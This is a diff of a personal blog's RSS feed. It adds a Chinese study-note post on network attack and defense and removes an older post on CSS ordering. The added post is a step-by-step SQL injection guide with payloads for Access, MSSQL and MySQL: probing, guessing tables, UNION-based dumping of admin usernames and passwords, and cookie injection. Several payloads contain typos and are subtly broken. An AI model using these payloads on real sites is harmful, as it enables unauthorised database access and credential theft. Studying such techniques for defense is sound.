@@ -8,8 +8,92 @@
     <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>记录gaoryrt的学习和生活</description>
-    <pubDate>Fri, 09 Sep 2016 08:23:43 GMT</pubDate>
+    <pubDate>Sun, 18 Sep 2016 19:38:51 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>Review of Network Attack and Defense</title>
+      <link>http://gaoryrt.com/2016/09-19-review-of-Network-attack-and-defense/</link>
+      <guid>http://gaoryrt.com/2016/09-19-review-of-Network-attack-and-defense/</guid>
+      <pubDate>Sun, 18 Sep 2016 17:02:38 GMT</pubDate>
+      <description>
+      
+        &lt;p&gt;SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。&lt;/p&gt;
+&lt;h2 id=&quot;SQL注入基础&quot;&gt;&lt;a href=&quot;#SQL注入基础&quot; class=&quot;headerlink&quot; title=&quot;SQL注入基础
+      
+      </description>
+      
+      <content:encoded>&lt;p&gt;SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。&lt;/p&gt;
+&lt;h2 id=&quot;SQL注入基础&quot;&gt;&lt;a href=&quot;#SQL注入基础&quot; class=&quot;headerlink&quot; title=&quot;SQL注入基础&quot;&gt;&lt;/a&gt;SQL注入基础&lt;/h2&gt;&lt;h3 id=&quot;1-试探-1-1，1-2&quot;&gt;&lt;a href=&quot;#1-试探-1-1，1-2&quot; class=&quot;headerlink&quot; title=&quot;1.试探 1=1，1=2&quot;&gt;&lt;/a&gt;1.试探 1=1，1=2&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;http://example.asp?id=49&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://example.asp?id=49&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://example.asp?id=49&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://example.asp?id=49&lt;/a&gt; &lt;code&gt;and 1=1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://example.asp?id=49&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://example.asp?id=49&lt;/a&gt; &lt;code&gt;and 1=2&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;可以注入的表现：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;正常显示&lt;/li&gt;
+&lt;li&gt;正常显示&lt;/li&gt;
+&lt;li&gt;提示BOF或EOF&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;不可注入的表现：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;正常显示&lt;/li&gt;
+&lt;li&gt;程序定义的错误提示或提示类型转换时出错。&lt;/li&gt;
+&lt;li&gt;同上&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&quot;2-判断数据库类型&quot;&gt;&lt;a href=&quot;#2-判断数据库类型&quot; class=&quot;headerlink&quot; title=&quot;2.判断数据库类型&quot;&gt;&lt;/a&gt;2.判断数据库类型&lt;/h3&gt;&lt;h4 id=&quot;加单引号&quot;&gt;&lt;a href=&quot;#加单引号&quot; class=&quot;headerlink&quot; title=&quot;加单引号&quot;&gt;&lt;/a&gt;加单引号&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;错误提示含有JET（JET是ACCESS数据库的数据库引擎）&lt;/li&gt;
+&lt;li&gt;错误提示中含有OLEDB（OLEDB是SQL SERVER使用的数据库引擎）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&quot;and-user-gt-0&quot;&gt;&lt;a href=&quot;#and-user-gt-0&quot; class=&quot;headerlink&quot; title=&quot;and user &amp;gt; 0&quot;&gt;&lt;/a&gt;and user &amp;gt; 0&lt;/h4&gt;&lt;p&gt;SQL SERVER出错：将nvarchar值“abc”转换数据类型为int的列时发生语法错误；“abc”正是变量user的值。SQL SERVER中有一个内置变量user，变量类型为nvarchar。&lt;/p&gt;
+&lt;p&gt;ACCESS的系统表[msysobjects]在web环境下读该表会提示“没有权限”；SQL SERVER的系统表[sysobjects]在web环境下不可正常读取。&lt;/p&gt;
+&lt;h4 id=&quot;and-select-count-from-sysobjects-gt-0&quot;&gt;&lt;a href=&quot;#and-select-count-from-sysobjects-gt-0&quot; class=&quot;headerlink&quot; title=&quot;and (select count (*) from sysobjects) &amp;gt; 0&quot;&gt;&lt;/a&gt;&lt;code&gt;and (select count (*) from sysobjects) &amp;gt; 0&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;SQL SERVER显示正常。ACCESS显示出错。&lt;/p&gt;
+&lt;h4 id=&quot;and-select-count-from-msysobjects-gt-0&quot;&gt;&lt;a href=&quot;#and-select-count-from-msysobjects-gt-0&quot; class=&quot;headerlink&quot; title=&quot;and (select count (*) from msysobjects) &amp;gt; 0&quot;&gt;&lt;/a&gt;&lt;code&gt;and (select count (*) from msysobjects) &amp;gt; 0&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;SQL SERVER显示正常。ACCESS显示没有权限。&lt;/p&gt;
+&lt;h3 id=&quot;3-猜表名&quot;&gt;&lt;a href=&quot;#3-猜表名&quot; class=&quot;headerlink&quot; title=&quot;3.猜表名&quot;&gt;&lt;/a&gt;3.猜表名&lt;/h3&gt;&lt;p&gt;&lt;code&gt;and (select count (*) from admin) &amp;gt;= 0&lt;/code&gt;&lt;br&gt;返回正常说明admin存在&lt;/p&gt;
+&lt;h3 id=&quot;4-猜字段&quot;&gt;&lt;a href=&quot;#4-猜字段&quot; class=&quot;headerlink&quot; title=&quot;4.猜字段&quot;&gt;&lt;/a&gt;4.猜字段&lt;/h3&gt;&lt;p&gt;&lt;code&gt;and (select count (content) from admin) &amp;gt;= 0&lt;/code&gt;&lt;br&gt;返回正常说明content字段存在&lt;/p&gt;
+&lt;p&gt;常用的猜字段函数&lt;br&gt;ACCESS: asc(字符)    返回字符的ascii&lt;br&gt;MSSQL: unicode(字符)    同上&lt;br&gt;ACCESS: char(数字)    返回ascii的字符&lt;br&gt;MSSQL: nchar()同上&lt;br&gt;ACCESS: mid(字符串,N,L)    返回字符串从N个字符起，长度为L的子字符串&lt;br&gt;MSSQL: substring(字符串,N,L)    同上&lt;br&gt;ACCESS,MSSQL: abc(数字)    返回数字的绝对值（猜汉字使用）&lt;br&gt;ACCESS,MSSQL: A between B and C    判断A是否在B和C之间&lt;/p&gt;
+&lt;p&gt;例&lt;code&gt;and (select asc(mind(password,1,1))from admin) &amp;gt; 100&lt;/code&gt;&lt;br&gt;查询admin中password字段第1个字符串的ascii是否大于100&lt;/p&gt;
+&lt;p&gt;例&lt;code&gt;select * from article where articleid = &amp;#39;&amp;#39; union select * from user where userid = 1&lt;/code&gt;&lt;br&gt;第一个select执行后返回结果&lt;code&gt;title&lt;/code&gt; &lt;code&gt;content&lt;/code&gt;&lt;br&gt;&lt;code&gt;select * from article where articleid = &amp;#39;&amp;#39;&lt;/code&gt;&lt;br&gt;第二个select执行后返回结果&lt;code&gt;username&lt;/code&gt; &lt;code&gt;password&lt;/code&gt;&lt;br&gt;&lt;code&gt;select * from user where userid = 1&lt;/code&gt;&lt;br&gt;整个select执行后返回结果&lt;code&gt;username&lt;/code&gt; &lt;code&gt;password&lt;/code&gt;&lt;br&gt;如果前面查询为真，则同时返回两次查询的内容&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;判断字段个数&lt;code&gt;order by&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查表名&lt;code&gt;and (select count (*) from admin) &amp;gt;= 0&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;猜测admin表的字段个数（假如有三个字段id,user,password）&lt;code&gt;union select 1,2,3,4,5,6,7,8,9,10,* from admin&lt;/code&gt;返回错误，&lt;code&gt;union select 1,2,3,* from admin&lt;/code&gt;返回正常&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;inner join on: 指定返回两个表中匹配的行&lt;br&gt;&lt;code&gt;select * from admin as a inner join admin as b on a.id = b.id&lt;/code&gt;返回一个表中的两个内容&lt;/p&gt;
+&lt;p&gt;上方&lt;code&gt;3&lt;/code&gt;中没法显示admin中所有的字段信息，扩大显示范围，构造如下语句&lt;code&gt;and 1=2 union select 1,2,3,* from admin as a inner join admin as b on a.id = b.id&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;select * from admin inner join admin1 on admin.id = admin1.id&lt;/code&gt;返回两个表内容&lt;/p&gt;
+&lt;h2 id=&quot;MSSQL&quot;&gt;&lt;a href=&quot;#MSSQL&quot; class=&quot;headerlink&quot; title=&quot;MSSQL&quot;&gt;&lt;/a&gt;MSSQL&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;判断字段个数&lt;code&gt;order by 13&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;判断字段回显位&lt;code&gt;and 1=2 union all select 1,2,null,4,5,6,7,8,9,10,11,null,13&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;数据库版本&lt;code&gt;and 1=2 union select 1,@@version,null,4,5,6,7,8,9,10,11,null,13&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;当前数据库名&lt;code&gt;and 1=2 union all select 1,db_name(),null,4,5,6,7,8,9,10,11,null,13&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;所有数据库名（通过更改dbid，7以上的是用户数据库）&lt;code&gt;and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from master.db0.sysdatabases where dbid = 7 --&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;表名（更改top后的数字来查询）&lt;code&gt;and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAER(85) and name not in (select top 1 name from data.db0.sysobjects where xtype = CHAR(85))--&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;字段对应id&lt;code&gt;and 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAR(85) and name not in (select top 7 name from data.bd0.sysobjects where xtype = CHAR(85))--&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;根据id查字段名&lt;code&gt;and 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.syscolumns where ID = 12345 and name not in (select top 1 name from data.db0.syscolumns where ID = 12345)--&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&quot;ASSESS&quot;&gt;&lt;a href=&quot;#ASSESS&quot; class=&quot;headerlink&quot; title=&quot;ASSESS&quot;&gt;&lt;/a&gt;ASSESS&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;试探&lt;code&gt;1=1&lt;/code&gt; &lt;code&gt;1=2&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;环境监测&lt;code&gt;and ord(mid(version(),1,1))&amp;gt;51&lt;/code&gt;正常则为mysql4以上版本，可以union查询&lt;code&gt;union select 1,version(),3&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;确定字段数&lt;code&gt;order by 13&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;判断精确字段&lt;code&gt;and 1=2 union select 1,2,3,4&lt;/code&gt;正常返回在页面中&lt;/li&gt;
+&lt;li&gt;爆数据库名&lt;code&gt;and 1=2 union select 1,user(),3,database()&lt;/code&gt;正常返回在页面中&lt;/li&gt;
+&lt;li&gt;爆表&lt;code&gt;and 1=2 union select 1,TABLE_NAME,3,4 from information_schema.tables where TABLE_SCHEMA = &amp;#39;blah&amp;#39;&lt;/code&gt;结果返回在2字段&lt;/li&gt;
+&lt;li&gt;爆字段&lt;code&gt;and 1=2 union select 1,COLUMN_NAME,3,4 from informations_chema.COLUMN where TABLE_NAME=&amp;#39;users&amp;#39;&lt;/code&gt; &lt;code&gt;and 1=2 union select char(mid(COLUMN-NAME)),2,3,4 from information_schema.COLUMN where TABLE_NAME=&amp;#39;users&amp;#39;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;爆数据&lt;code&gt;and 1=2 union select 1,user,3,password form phptest.users&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&quot;cookie注入&quot;&gt;&lt;a href=&quot;#cookie注入&quot; class=&quot;headerlink&quot; title=&quot;cookie注入&quot;&gt;&lt;/a&gt;cookie注入&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;在原地址加单引号&lt;/li&gt;
+&lt;li&gt;去掉id值，页面出错，构造cookie语句：&lt;code&gt;javascript:alert(document.cookie=&amp;quot;id=&amp;quot;+escape(&amp;quot;30 and 1=1&amp;quot;))&lt;/code&gt;会弹窗&lt;/li&gt;
+&lt;li&gt;关闭弹窗，去掉id访问，页面正常&lt;/li&gt;
+&lt;li&gt;猜测字段&lt;code&gt;javascript:alert(document.cookie=&amp;quot;id=&amp;quot;+escape(&amp;quot;30 order by 5&amp;quot;))&lt;/code&gt;点击确认，去掉id访问，页面正常则正常&lt;/li&gt;
+&lt;li&gt;判断回显位&lt;code&gt;javascript:alert(document.cookie=&amp;quot;id=&amp;quot;+escape(&amp;quot;30 union select 1,2,3,4 from admin&amp;quot;))&lt;/code&gt;点击确认，去掉id访问，页面正常则正常&lt;/li&gt;
+&lt;li&gt;猜解user password字段&lt;code&gt;javascript:alert(document.cookie=&amp;quot;id=&amp;quot;+escape(&amp;quot;30 union select 1,user,3,4 from admin&amp;quot;))&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</content:encoded>
+      
+      <comments>http://gaoryrt.com/2016/09-19-review-of-Network-attack-and-defense/#disqus_thread</comments>
+    </item>
     
     <item>
       <title>100aap 动耳听</title>
@@ -726,63 +810,6 @@
 </content:encoded>
       
       <comments>http://gaoryrt.com/2016/04-25-reviewVirusPrinciple/#disqus_thread</comments>
-    </item>
-    
-    <item>
-      <title>CssOrder</title>
-      <link>http://gaoryrt.com/2016/04-23-cssOrder/</link>
-      <guid>http://gaoryrt.com/2016/04-23-cssOrder/</guid>
-      <pubDate>Fri, 22 Apr 2016 19:29:34 GMT</pubDate>
-      <description>
-      
-        &lt;p&gt;阅读了&lt;a href=&quot;http://www.w3cn.org/article/translate/2005/104.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CSS的十八般技巧&lt;/a&gt;和&lt;a href=&quot;http://www.shejida
-      
-      </description>
-      
-      <content:encoded>&lt;p&gt;阅读了&lt;a href=&quot;http://www.w3cn.org/article/translate/2005/104.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CSS的十八般技巧&lt;/a&gt;和&lt;a href=&quot;http://www.shejidaren.com/css-written-specifications.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;推荐大家使用的CSS书写规范、顺序&lt;/a&gt;两篇文章之后，对css 压缩和美化有了另一番认识。&lt;br&gt;&lt;code&gt;2016-04-27 更新&lt;/code&gt;：发现CSSComb已经实现并且很优雅。&lt;a href=&quot;http://csscomb.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;csscomb&lt;/a&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;h1 id=&quot;美化-Beautify-EasytoRead&quot;&gt;&lt;a href=&quot;#美化-Beautify-EasytoRead&quot; class=&quot;headerlink&quot; title=&quot;美化/ Beautify/ EasytoRead&quot;&gt;&lt;/a&gt;美化/ Beautify/ EasytoRead&lt;/h1&gt;&lt;h2 id=&quot;书写顺序&quot;&gt;&lt;a href=&quot;#书写顺序&quot; class=&quot;headerlink&quot; title=&quot;书写顺序&quot;&gt;&lt;/a&gt;书写顺序&lt;/h2&gt;&lt;p&gt;这个并没有统一的标准，以便于阅读理解为首要目的排序。&lt;br&gt;显示属性  &lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;display&lt;/li&gt;
-&lt;li&gt;float&lt;/li&gt;
-&lt;li&gt;position&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;自身属性  &lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;width&lt;/li&gt;
-&lt;li&gt;height&lt;/li&gt;
-&lt;li&gt;margin&lt;/li&gt;
-&lt;li&gt;outline&lt;/li&gt;
-&lt;li&gt;border&lt;/li&gt;
-&lt;li&gt;padding&lt;/li&gt;
-&lt;li&gt;background&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;文本属性&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;color &lt;/li&gt;
-&lt;li&gt;font&lt;/li&gt;
-&lt;li&gt;vertical-align&lt;/li&gt;
-&lt;li&gt;white-space&lt;/li&gt;
-&lt;li&gt;content&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&quot;CSS顺序&quot;&gt;&lt;a href=&quot;#CSS顺序&quot; class=&quot;headerlink&quot; title=&quot;CSS顺序&quot;&gt;&lt;/a&gt;CSS顺序&lt;/h2&gt;&lt;p&gt;css中节点排序，暂时没有想到一个好办法。大概思路就是按照Dom节点的顺序排序，但是js如何获得css选择器一样的节点集呢？&lt;br&gt;问题暂时放这里。  &lt;/p&gt;
-&lt;hr&gt;
-&lt;h1 id=&quot;压缩-Uglify-Compress&quot;&gt;&lt;a href=&quot;#压缩-Uglify-Compress&quot; class=&quot;headerlink&quot; title=&quot;压缩/ Uglify/ Compress&quot;&gt;&lt;/a&gt;压缩/ Uglify/ Compress&lt;/h1&gt;&lt;h2 id=&quot;CSS缩写&quot;&gt;&lt;a href=&quot;#CSS缩写&quot; class=&quot;headerlink&quot; title=&quot;CSS缩写&quot;&gt;&lt;/a&gt;CSS缩写&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;background: background-image ~-repeat ~-position&lt;/li&gt;
-&lt;li&gt;font: font-style | font-variant | font-weight | font-size | line-height | font-family&lt;/li&gt;
-&lt;li&gt;去掉最后一个分号&lt;/li&gt;
-&lt;li&gt;去掉小数点前的 0&lt;/li&gt;
-&lt;li&gt;去掉 0 之后的单位&lt;/li&gt;
-&lt;li&gt;rgb/rgba 颜色值简写为16进制值&lt;/li&gt;
-&lt;li&gt;在确定能减少总大小的前提下，用合并条目&lt;/li&gt;
-&lt;li&gt;（不确定）去掉选择器前的 ul，div 等无效名&lt;/li&gt;
-&lt;li&gt;（不确定）其他简写方式，例如 border-top-style: none -&amp;gt; border-top: 0&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;p&gt;在写出自己的自动化工具之前还是用用其他工具，然后书写时也注意一些吧。&lt;br&gt;以上&lt;/p&gt;
-</content:encoded>
-      
-      <comments>http://gaoryrt.com/2016/04-23-cssOrder/#disqus_thread</comments>
     </item>
     
   </channel>
